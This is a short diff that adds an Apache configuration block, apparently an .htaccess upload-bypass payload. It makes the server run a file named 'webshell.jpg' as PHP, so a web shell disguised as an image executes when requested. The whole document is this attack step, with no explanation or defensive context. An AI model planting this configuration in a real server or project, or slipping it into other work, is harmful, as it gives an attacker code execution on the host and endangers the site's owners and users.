@@ -1,0 +1,6 @@
+	<Files "webshell.jpg">
+	    # If using php-fpm (PHP FastCGI Process Manager)
+	    SetHandler "proxy:fcgi://localhost"
+	    # If using Apache2's built-in mod_php
+	    SetHandler application/x-httpd-php
+	</Files>
